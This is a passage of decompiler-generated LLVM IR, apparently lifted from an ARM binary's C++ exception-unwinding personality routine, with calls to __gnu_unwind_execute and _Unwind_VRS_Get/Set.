  %v1_19a88 = mul i32 %v0_19a88, 2
  %v3_19a90 = and i32 %v1_19a88, 2
  %v4_19a90 = or i32 %v3_19a90, %v1_19a8c
  store i32 %v4_19a90, i32* %r2.global-to-local, align 4
  %v7_19a94 = icmp eq i32 %v4_19a90, 1
  br i1 %v7_19a94, label %dec_label_pc_19c28, label %dec_label_pc_19a9c

dec_label_pc_19a9c:                               ; preds = %bb154
  %v2_19a94 = icmp eq i32 %v4_19a90, 0
  br i1 %v2_19a94, label %dec_label_pc_19aa0, label %dec_label_pc_19b50

dec_label_pc_19aa0:                               ; preds = %dec_label_pc_19a9c
  store i32 %v1_199a8, i32* %r2.global-to-local, align 4
  br i1 %v2_19aa4, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_19aa0
  %v0_19ab8119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_19ab8

bb155:                                            ; preds = %dec_label_pc_19aa0
  %v2_19ab0 = icmp eq i32 %v0_19c34, 0
  %v0_19ab8 = load i32, i32* @r7, align 4
  br i1 %v2_19ab0, label %dec_label_pc_19ab8, label %dec_label_pc_19e30

dec_label_pc_19ab8:                               ; preds = %.thread, %bb155
  %v0_19ab8120 = phi i32 [ %v0_19ab8119, %.thread ], [ %v0_19ab8, %bb155 ]
  %v1_19ab8 = add i32 %v0_19ab8120, 4
  %v1_19abc = inttoptr i32 %v1_19ab8 to i32*
  %v2_19abc = load i32, i32* %v1_19abc, align 4
  %v2_19ac0 = icmp eq i32 %v2_19abc, 0
  br i1 %v2_19ac0, label %dec_label_pc_19ac8, label %dec_label_pc_19a14

dec_label_pc_19ac8:                               ; preds = %dec_label_pc_19cdc, %dec_label_pc_19ca0, %dec_label_pc_19ab8, %dec_label_pc_19a08.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_19a08.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19ab8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19ca0 ], [ %stack_var_-76.4, %dec_label_pc_19cdc ]
  %v0_19ac8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19ac8, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_19ad0 = call i32 @__gnu_unwind_execute(i32 %v0_19ac8, %anon_struct_13* %tmp156)
  store i32 %v4_19ad0, i32* %r0.global-to-local, align 4
  store i32 %v4_19ad0, i32* %r5.global-to-local, align 4
  %v2_19ad4 = icmp eq i32 %v4_19ad0, 0
  br i1 %v2_19ad4, label %dec_label_pc_19adc, label %dec_label_pc_19b58

dec_label_pc_19adc:                               ; preds = %dec_label_pc_19ac8
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_19ae0 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_19ae0, label %bb157, label %dec_label_pc_19aec

bb157:                                            ; preds = %dec_label_pc_19adc
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b5c

dec_label_pc_19aec:                               ; preds = %dec_label_pc_19adc
  %v2_19aec = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_19aec, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19afc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19afc, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_19b04 = call i32 @_Unwind_VRS_Get(i32 %v0_19afc, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_19b08 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_19afc, i32* %r0.global-to-local, align 4
  %v5_19b1c = call i32 @_Unwind_VRS_Set(i32 %v0_19afc, i32 %v0_19b08, i32 14, i32 %v0_19b08, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19b1c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r2.global-to-local, align 4
  %v4_19b28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 32) to i32*), align 4
  %v0_19b2c = load i32, i32* %r5.global-to-local, align 4
  %v0_19b30 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19b30, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_19b28, i32* %stack_var_-48, align 4
  %v5_19b44 = call i32 @_Unwind_VRS_Set(i32 %v0_19b30, i32 %v0_19b2c, i32 15, i32 %v0_19b2c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b5c

dec_label_pc_19b50:                               ; preds = %dec_label_pc_19a9c
  %v7_19b50 = icmp eq i32 %v4_19a90, 2
  br i1 %v7_19b50, label %dec_label_pc_19b68, label %dec_label_pc_19b58

dec_label_pc_19b58:                               ; preds = %dec_label_pc_19b50, %dec_label_pc_19c3c, %dec_label_pc_19ac8, %dec_label_pc_19e30
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b5c

dec_label_pc_19b5c:                               ; preds = %bb157, %dec_label_pc_19e68, %dec_label_pc_19df8, %bb166, %dec_label_pc_19aec, %dec_label_pc_19b58
  %v1_19b64 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_19e68 ], [ %v1_19b64.pre, %dec_label_pc_19df8 ], [ 7, %bb166 ], [ 7, %dec_label_pc_19aec ], [ 9, %dec_label_pc_19b58 ]
  store i32 %v3_19978, i32* %r4.global-to-local, align 4
  store i32 %v6_19978, i32* %r5.global-to-local, align 4
  ret i32 %v1_19b64

dec_label_pc_19b68:                               ; preds = %dec_label_pc_19b50
  store i32 %v1_199a8, i32* %r2.global-to-local, align 4
  %v0_19b6c = load i32, i32* @r7, align 4
  %v1_19b6c = inttoptr i32 %v0_19b6c to i32*
  %v2_19b6c = load i32, i32* %v1_19b6c, align 4
  %tmp206 = bitcast i32 %v2_19b6c to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_19b74 = bitcast float %tmp207 to i32
  store i32 %v1_19b74, i32* @sl, align 4
  br i1 %v2_19aa4, label %dec_label_pc_19b7c, label %dec_label_pc_19ce8

dec_label_pc_19b7c:                               ; preds = %dec_label_pc_19b68
  %v2_19b7c = icmp eq i32 %v0_19c34, 0
  br i1 %v2_19b7c, label %dec_label_pc_19cd0, label %dec_label_pc_19b84

dec_label_pc_19b84:                               ; preds = %dec_label_pc_19b7c
  %v2_19b88 = icmp eq i32 %v1_19b74, 0
  br i1 %v2_19b88, label %dec_label_pc_19b94.thread, label %bb159

dec_label_pc_19b94.thread:                        ; preds = %dec_label_pc_19b84
  br label %dec_label_pc_19df8

bb159:                                            ; preds = %dec_label_pc_19b84
  br i1 %v3_19b8c, label %dec_label_pc_19b9c, label %dec_label_pc_19cd0

dec_label_pc_19b9c:                               ; preds = %bb159
  %v1_19b9c = add i32 %v0_19b6c, 4
  store i32 %v1_19b9c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_19bac = load i32, i32* @r8, align 4
  %v1_19bac = add i32 %v0_19bac, 88
  store i32 %v1_19bac, i32* %sb.global-to-local, align 4
  store i32 %v1_19b9c, i32* @r4, align 4
  br label %dec_label_pc_19bd0

dec_label_pc_19bc0:                               ; preds = %bb161
  %v1_19bc0 = add i32 %v0_19bc0, 1
  store i32 %v1_19bc0, i32* @r5, align 4
  %v1_19bc4 = load i32, i32* @sl, align 4
  %v9_19bc4 = icmp eq i32 %v1_19bc0, %v1_19bc4
  %v0_19bc8 = load i32, i32* @r4, align 4
  %v1_19bc8 = add i32 %v0_19bc8, 4
  store i32 %v1_19bc8, i32* @r4, align 4
  br i1 %v9_19bc4, label %dec_label_pc_19df8, label %dec_label_pc_19bc0.dec_label_pc_19bd0_crit_edge

dec_label_pc_19bc0.dec_label_pc_19bd0_crit_edge:  ; preds = %dec_label_pc_19bc0
  %v0_19bdc.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_19bd0

dec_label_pc_19bd0:                               ; preds = %dec_label_pc_19bc0.dec_label_pc_19bd0_crit_edge, %dec_label_pc_19b9c
  %v0_19bdc = phi i32 [ %v0_19bdc.pre, %dec_label_pc_19bc0.dec_label_pc_19bd0_crit_edge ], [ %v1_19bac, %dec_label_pc_19b9c ]
  %v1_19be0 = phi i32 [ %v1_19bc8, %dec_label_pc_19bc0.dec_label_pc_19bd0_crit_edge ], [ %v1_19b9c, %dec_label_pc_19b9c ]
  %v1_19bd0 = inttoptr i32 %v1_19be0 to i32*
  %v2_19bd0 = load i32, i32* %v1_19bd0, align 4
  %v2_19bd4 = icmp eq i32 %v2_19bd0, 0
  store i32 %v0_19bdc, i32* %forced_unwind_-44, align 4
  br i1 %v2_19bd4, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_19bd0
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_19bd0, %bb160
  %v0_19be4 = load i32, i32* @r8, align 4
  store i32 %v0_19be4, i32* %r0.global-to-local, align 4
  store i32 %v2_19c70, i32* %r2.global-to-local, align 4
  %v4_19bf4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 100) to i32*), align 4
  store i32 105472, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19bf4)
  %v0_19c00 = load i32, i32* %r0.global-to-local, align 4
  %v2_19c00 = icmp eq i32 %v0_19c00, 0
  %v0_19bc0 = load i32, i32* @r5, align 4
  br i1 %v2_19c00, label %dec_label_pc_19bc0, label %dec_label_pc_19c08

dec_label_pc_19c08:                               ; preds = %bb161
  %v1_19c08 = load i32, i32* @sl, align 4
  %v9_19c08 = icmp eq i32 %v0_19bc0, %v1_19c08
  br i1 %v9_19c08, label %dec_label_pc_19df8, label %dec_label_pc_19c10

dec_label_pc_19c10:                               ; preds = %dec_label_pc_19c08
  %v0_19c10 = load i32, i32* @r7, align 4
  %v1_19c10 = inttoptr i32 %v0_19c10 to i32*
  %v2_19c10 = load i32, i32* %v1_19c10, align 4
  %v1_19c14 = icmp slt i32 %v2_19c10, 0
  %v0_19c1c.pre = load i32, i32* @r6, align 4
  br i1 %v1_19c14, label %dec_label_pc_19c1c, label %dec_label_pc_19cdc

dec_label_pc_19c1c:                               ; preds = %dec_label_pc_19c10, %dec_label_pc_19cd4
  %v0_19c1c = phi i32 [ %storemerge, %dec_label_pc_19cd4 ], [ %v0_19c1c.pre, %dec_label_pc_19c10 ]
  store i32 %v0_19c1c, i32* %r0.global-to-local, align 4
  %v1_19c20 = add i32 %v0_19c1c, 4
  store i32 %v1_19c20, i32* @r6, align 4
  br label %dec_label_pc_19cdc

dec_label_pc_19c28:                               ; preds = %bb154
  store i32 %v1_199a8, i32* %r2.global-to-local, align 4
  br i1 %v2_19aa4, label %dec_label_pc_19c34, label %dec_label_pc_19d20

dec_label_pc_19c34:                               ; preds = %dec_label_pc_19c28
  %v2_19c34 = icmp eq i32 %v0_19c34, 0
  br i1 %v2_19c34, label %dec_label_pc_19ca0, label %dec_label_pc_19c3c

dec_label_pc_19c3c:                               ; preds = %dec_label_pc_19c34
  %v0_19c3c = load i32, i32* @r7, align 4
  %v1_19c3c = add i32 %v0_19c3c, 4
  %v2_19c3c = inttoptr i32 %v1_19c3c to i32*
  %v3_19c3c = load i32, i32* %v2_19c3c, align 4
  %v7_19c40 = icmp eq i32 %v3_19c3c, -2
  store i32 %v1_19c3c, i32* %r2.global-to-local, align 4
  br i1 %v7_19c40, label %dec_label_pc_19b58, label %dec_label_pc_19c4c

dec_label_pc_19c4c:                               ; preds = %dec_label_pc_19c3c
  %v0_19c4c = load i32, i32* @r8, align 4
  %v1_19c4c = add i32 %v0_19c4c, 88
  %v7_19c50 = icmp eq i32 %v3_19c3c, -1
  store i32 %v1_19c4c, i32* %forced_unwind_-44, align 4
  br i1 %v7_19c50, label %dec_label_pc_19c94, label %dec_label_pc_19c5c

dec_label_pc_19c5c:                               ; preds = %dec_label_pc_19c4c
  %v2_19c60 = icmp eq i32 %v3_19c3c, 0
  br i1 %v2_19c60, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_19c5c
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_19c5c, %bb162
  store i32 %v0_19c4c, i32* %r0.global-to-local, align 4
  store i32 %v2_19c70, i32* %r2.global-to-local, align 4
  %v4_19c7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 100) to i32*), align 4
  store i32 105608, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19c7c)
  %v0_19c88 = load i32, i32* %r0.global-to-local, align 4
  %v2_19c88 = icmp eq i32 %v0_19c88, 0
  br i1 %v2_19c88, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_19c94.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_19c94

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_19ca0

dec_label_pc_19c94:                               ; preds = %.thread25, %dec_label_pc_19c4c
  %v3_19c94 = phi i32 [ %v3_19c94.pr, %.thread25 ], [ %v1_19c4c, %dec_label_pc_19c4c ]
  %v2_19c98 = icmp eq i32 %v3_19c94, 0
  br i1 %v2_19c98, label %dec_label_pc_19ca0, label %dec_label_pc_19df8

dec_label_pc_19ca0:                               ; preds = %bb164, %dec_label_pc_19d4c, %dec_label_pc_19d20, %dec_label_pc_19c94, %dec_label_pc_19c34
  %v0_19ca0 = load i32, i32* @r7, align 4
  %v1_19ca0 = add i32 %v0_19ca0, 8
  %v1_19a08 = inttoptr i32 %v1_19ca0 to i32*
  %v2_19a08 = load i32, i32* %v1_19a08, align 4
  %v2_19a0c = icmp eq i32 %v2_19a08, 0
  br i1 %v2_19a0c, label %dec_label_pc_19ac8, label %dec_label_pc_19a14.preheader

dec_label_pc_19ca8:                               ; preds = %entry
  %v3_19ca8 = udiv i32 %v2_1999c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_19cb8 = mul nuw nsw i32 %v3_19ca8, 4
  %v3_19cbc = mul i32 %v2_1999c, 65536
  %v2_19cc0 = add i32 %v6_19cb8, %v4_1999c
  store i32 %v3_19cbc, i32* %v4_199bc, align 8
  br label %dec_label_pc_199e4

dec_label_pc_19cd0:                               ; preds = %bb159, %dec_label_pc_19b7c
  %v1_19cd0 = add i32 %v0_19b6c, 4
  br label %dec_label_pc_19cd4

dec_label_pc_19cd4:                               ; preds = %dec_label_pc_19d14, %dec_label_pc_19cd0
  %v0_19cd4 = phi i32 [ %v2_19d14, %dec_label_pc_19d14 ], [ %v2_19b6c, %dec_label_pc_19cd0 ]
  %storemerge = phi i32 [ %v4_19d14, %dec_label_pc_19d14 ], [ %v1_19cd0, %dec_label_pc_19cd0 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_19cd4 = icmp slt i32 %v0_19cd4, 0
  br i1 %v1_19cd4, label %dec_label_pc_19c1c, label %dec_label_pc_19cdc

dec_label_pc_19cdc:                               ; preds = %dec_label_pc_19c10, %dec_label_pc_19cd4, %dec_label_pc_19de8, %dec_label_pc_19c1c
  %v0_19ce0 = phi i32 [ %v1_19c20, %dec_label_pc_19c1c ], [ %storemerge, %dec_label_pc_19cd4 ], [ %v1_19dec, %dec_label_pc_19de8 ], [ %v0_19c1c.pre, %dec_label_pc_19c10 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_19c1c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19cd4 ], [ %v1_19de8, %dec_label_pc_19de8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19c10 ]
  %v0_19cdc = load i32, i32* @sl, align 4
  %v3_19cdc = mul i32 %v0_19cdc, 4
  %v2_19ce0 = add i32 %v3_19cdc, %v0_19ce0
  %v1_19a0865 = inttoptr i32 %v2_19ce0 to i32*
  %v2_19a0866 = load i32, i32* %v1_19a0865, align 4
  %v2_19a0c68 = icmp eq i32 %v2_19a0866, 0
  br i1 %v2_19a0c68, label %dec_label_pc_19ac8, label %dec_label_pc_19a14.preheader.lr.ph

dec_label_pc_19ce8:                               ; preds = %dec_label_pc_19b68
  %v0_19cf8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19cf8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19d00 = load i32, i32* @r8, align 4
  %v1_19d00 = add i32 %v0_19d00, 32
  %v2_19d00 = inttoptr i32 %v1_19d00 to i32*
  %v3_19d00 = load i32, i32* %v2_19d00, align 4
  store i32 %v3_19d00, i32* @r4, align 4
  %v5_19d04 = call i32 @_Unwind_VRS_Get(i32 %v0_19cf8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19d04, i32* %r0.global-to-local, align 4
  %v3_19d08 = load i32, i32* %stack_var_-48, align 4
  %v0_19d0c = load i32, i32* @r4, align 4
  %v9_19d0c = icmp eq i32 %v0_19d0c, %v3_19d08
  br i1 %v9_19d0c, label %dec_label_pc_19db4, label %dec_label_pc_19ce8.dec_label_pc_19d14_crit_edge

dec_label_pc_19ce8.dec_label_pc_19d14_crit_edge:  ; preds = %dec_label_pc_19ce8
  %v0_19d14.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_19d14

dec_label_pc_19d14:                               ; preds = %dec_label_pc_19ce8.dec_label_pc_19d14_crit_edge, %dec_label_pc_19db4
  %v0_19d14 = phi i32 [ %v0_19d14.pre, %dec_label_pc_19ce8.dec_label_pc_19d14_crit_edge ], [ %v1_19db8, %dec_label_pc_19db4 ]
  %v1_19d14 = inttoptr i32 %v0_19d14 to i32*
  %v2_19d14 = load i32, i32* %v1_19d14, align 4
  %v4_19d14 = add i32 %v0_19d14, 4
  store i32 %v4_19d14, i32* @r7, align 4
  br label %dec_label_pc_19cd4

dec_label_pc_19d20:                               ; preds = %dec_label_pc_19c28
  %v0_19d30 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19d30, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19d38 = load i32, i32* @r8, align 4
  %v1_19d38 = add i32 %v0_19d38, 32
  %v2_19d38 = inttoptr i32 %v1_19d38 to i32*
  %v3_19d38 = load i32, i32* %v2_19d38, align 4
  store i32 %v3_19d38, i32* @r4, align 4
  %v5_19d3c = call i32 @_Unwind_VRS_Get(i32 %v0_19d30, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19d3c, i32* %r0.global-to-local, align 4
  %v3_19d40 = load i32, i32* %stack_var_-48, align 4
  %v0_19d44 = load i32, i32* @r4, align 4
  %v9_19d44 = icmp eq i32 %v0_19d44, %v3_19d40
  br i1 %v9_19d44, label %dec_label_pc_19d4c, label %dec_label_pc_19ca0

dec_label_pc_19d4c:                               ; preds = %dec_label_pc_19d20
  %v0_19d4c = load i32, i32* @r8, align 4
  %v1_19d4c = add i32 %v0_19d4c, 40
  %v2_19d4c = inttoptr i32 %v1_19d4c to i32*
  %v3_19d4c = load i32, i32* %v2_19d4c, align 4
  %v1_19d50 = load i32, i32* @r7, align 4
  %v9_19d50 = icmp eq i32 %v3_19d4c, %v1_19d50
  br i1 %v9_19d50, label %dec_label_pc_19d58, label %dec_label_pc_19ca0

dec_label_pc_19d58:                               ; preds = %dec_label_pc_19d4c
  %v1_19d58 = inttoptr i32 %v3_19d4c to i32*
  %v2_19d58 = load i32, i32* %v1_19d58, align 4
  %v1_19d5c = and i32 %v2_19d58, 1073741824
  %v2_19d5c = icmp eq i32 %v1_19d5c, 0
  br i1 %v2_19d5c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_19d58
  %v2_19d60 = or i32 %v2_19d58, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_19d58
  %tmp208 = bitcast i32 %v2_19d58 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_19d64 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_19d68 = phi i32 [ %v2_19e98, %.thread28 ], [ %v2_19e98, %bb169 ], [ %v3_19d4c, %bb165 ], [ %v3_19d4c, %.thread26 ]
  %v0_19d68 = phi i32 [ %v2_19ea8, %.thread28 ], [ %v2_19ea4, %bb169 ], [ %v2_19d60, %bb165 ], [ %v2_19d64, %.thread26 ]
  %v2_19d68 = add i32 %v0_19d68, %v1_19d68
  store i32 %v2_19d68, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19d80 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19d80, i32* %r0.global-to-local, align 4
  %v5_19d88 = call i32 @_Unwind_VRS_Set(i32 %v0_19d80, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_19d80, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_19da0 = load i32, i32* @r8, align 4
  store i32 %v0_19da0, i32* %stack_var_-48, align 4
  %v5_19da8 = call i32 @_Unwind_VRS_Set(i32 %v0_19d80, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b5c

dec_label_pc_19db4:                               ; preds = %dec_label_pc_19ce8
  %v0_19db4 = load i32, i32* @r8, align 4
  %v1_19db4 = add i32 %v0_19db4, 40
  %v2_19db4 = inttoptr i32 %v1_19db4 to i32*
  %v3_19db4 = load i32, i32* %v2_19db4, align 4
  %v1_19db8 = load i32, i32* @r7, align 4
  %v9_19db8 = icmp eq i32 %v3_19db4, %v1_19db8
  br i1 %v9_19db8, label %dec_label_pc_19dc0, label %dec_label_pc_19d14

dec_label_pc_19dc0:                               ; preds = %dec_label_pc_19db4
  %v1_19dc4 = add i32 %v3_19db4, 4
  store i32 %v1_19dc4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_19dcc = add i32 %v0_19db4, 44
  %v3_19dcc = inttoptr i32 %v2_19dcc to i32*
  store i32 0, i32* %v3_19dcc, align 4
  %v0_19dd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_19dd0 = load i32, i32* @r8, align 4
  %v2_19dd0 = add i32 %v1_19dd0, 48
  %v3_19dd0 = inttoptr i32 %v2_19dd0 to i32*
  store i32 %v0_19dd0, i32* %v3_19dd0, align 4
  %v0_19dd4 = load i32, i32* @sl, align 4
  %v1_19dd4 = load i32, i32* @r8, align 4
  %v2_19dd4 = add i32 %v1_19dd4, 40
  %v3_19dd4 = inttoptr i32 %v2_19dd4 to i32*
  store i32 %v0_19dd4, i32* %v3_19dd4, align 4
  %v0_19dd8 = load i32, i32* %r0.global-to-local, align 4
  %v1_19dd8 = load i32, i32* @r8, align 4
  %v2_19dd8 = add i32 %v1_19dd8, 52
  %v3_19dd8 = inttoptr i32 %v2_19dd8 to i32*
  store i32 %v0_19dd8, i32* %v3_19dd8, align 4
  %v0_19ddc = load i32, i32* @r7, align 4
  %v1_19ddc = inttoptr i32 %v0_19ddc to i32*
  %v2_19ddc = load i32, i32* %v1_19ddc, align 4
  %v1_19de0 = icmp slt i32 %v2_19ddc, 0
  br i1 %v1_19de0, label %dec_label_pc_19de8, label %dec_label_pc_19e94

dec_label_pc_19de8:                               ; preds = %dec_label_pc_19dc0
  %v0_19de8 = load i32, i32* %r2.global-to-local, align 4
  %v1_19de8 = add i32 %v0_19de8, -3
  store i32 %v1_19de8, i32* %r2.global-to-local, align 4
  %v0_19dec = load i32, i32* %r0.global-to-local, align 4
  %v1_19dec = add i32 %v0_19dec, 4
  store i32 %v1_19dec, i32* @r6, align 4
  br label %dec_label_pc_19cdc

dec_label_pc_19df8:                               ; preds = %dec_label_pc_19c08, %dec_label_pc_19c94, %dec_label_pc_19bc0, %dec_label_pc_19b94.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19e08 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19e08, i32* %r0.global-to-local, align 4
  %v5_19e10 = call i32 @_Unwind_VRS_Get(i32 %v0_19e08, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_19e14 = load i32, i32* @r7, align 4
  %v1_19e14 = load i32, i32* @r8, align 4
  %v2_19e14 = add i32 %v1_19e14, 40
  %v3_19e14 = inttoptr i32 %v2_19e14 to i32*
  store i32 %v0_19e14, i32* %v3_19e14, align 4
  %v3_19e18 = load i32, i32* %stack_var_-48, align 4
  %v3_19e1c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_19e1c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_19e24 = load i32, i32* @r8, align 4
  %v2_19e24 = add i32 %v1_19e24, 32
  %v3_19e24 = inttoptr i32 %v2_19e24 to i32*
  store i32 %v3_19e18, i32* %v3_19e24, align 4
  %v0_19e28 = load i32, i32* %r2.global-to-local, align 4
  %v1_19e28 = load i32, i32* @r8, align 4
  %v2_19e28 = add i32 %v1_19e28, 36
  %v3_19e28 = inttoptr i32 %v2_19e28 to i32*
  store i32 %v0_19e28, i32* %v3_19e28, align 4
  %v1_19b64.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b5c

dec_label_pc_19e30:                               ; preds = %bb155
  %v1_19e30 = inttoptr i32 %v0_19ab8 to i32*
  %v2_19e30 = load i32, i32* %v1_19e30, align 4
  %v1_19e34 = add i32 %v0_19ab8, 4
  %v1_19e38 = and i32 %v2_19e30, 1073741824
  %v2_19e38 = icmp eq i32 %v1_19e38, 0
  %v2_19e3c = or i32 %v2_19e30, -2147483648
  %tmp210 = bitcast i32 %v2_19e30 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_19e40 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_19e38, i32 %v2_19e40, i32 %v2_19e3c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_19e44 = load i32, i32* @r8, align 4
  %v2_19e44 = add i32 %v1_19e44, 56
  %v3_19e44 = inttoptr i32 %v2_19e44 to i32*
  store i32 %v1_19e34, i32* %v3_19e44, align 4
  %v0_19e48 = load i32, i32* @r8, align 4
  store i32 %v0_19e48, i32* %r0.global-to-local, align 4
  %v4_19e54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 28) to i32*), align 4
  store i32 106080, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19e54)
  %v0_19e60 = load i32, i32* %r0.global-to-local, align 4
  %v2_19e60 = icmp eq i32 %v0_19e60, 0
  br i1 %v2_19e60, label %dec_label_pc_19b58, label %dec_label_pc_19e68

dec_label_pc_19e68:                               ; preds = %dec_label_pc_19e30
  %v0_19e68 = load i32, i32* %r4.global-to-local, align 4
  %v1_19e68 = load i32, i32* @r7, align 4
  %v2_19e68 = add i32 %v1_19e68, %v0_19e68
  store i32 %v2_19e68, i32* %stack_var_-48, align 4
  %v0_19e78 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19e78, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_19e88 = call i32 @_Unwind_VRS_Set(i32 %v0_19e78, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b5c

dec_label_pc_19e94:                               ; preds = %dec_label_pc_19dc0
  %v0_19e94 = load i32, i32* @sl, align 4
  %v3_19e94 = mul i32 %v0_19e94, 4
  %v0_19e98 = load i32, i32* %r0.global-to-local, align 4
  %v2_19e98 = add i32 %v0_19e98, %v3_19e94
  %v3_19e98 = inttoptr i32 %v2_19e98 to i32*
  %v4_19e98 = load i32, i32* %v3_19e98, align 4
  %v1_19e9c = and i32 %v4_19e98, 1073741824
  %v2_19e9c = icmp eq i32 %v1_19e9c, 0
  br i1 %v2_19e9c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_19e94
  %v2_19ea4 = or i32 %v4_19e98, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_19e94
  %tmp212 = bitcast i32 %v4_19e98 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_19ea8 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_19e98, { 2, 1, 0 }
  uselistorder i32 %v1_19dec, { 1, 0 }
  uselistorder i32 %v1_19de8, { 1, 0 }
  uselistorder i32 %v1_19db8, { 1, 0 }
  uselistorder i32 %v0_19d80, { 1, 0, 2, 3 }
  uselistorder i32 %v3_19d4c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_19d14, { 1, 0 }
  uselistorder i32 %v0_19d14, { 1, 0 }
  uselistorder i32 %v2_19a0866, { 1, 0 }
  uselistorder i32 %v2_19ce0, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_19a08, { 1, 0 }
  uselistorder i32 %v1_19ca0, { 1, 0 }
  uselistorder i32 %v3_19c3c, { 2, 0, 1 }
  uselistorder i32 %v0_19c1c, { 1, 0 }
  uselistorder i32 %v0_19c1c.pre, { 1, 0 }
  uselistorder i32 %v1_19b74, { 1, 0 }
  uselistorder i32 %v2_19b6c, { 1, 0 }
  uselistorder i32 %v0_19afc, { 1, 0, 2, 3 }
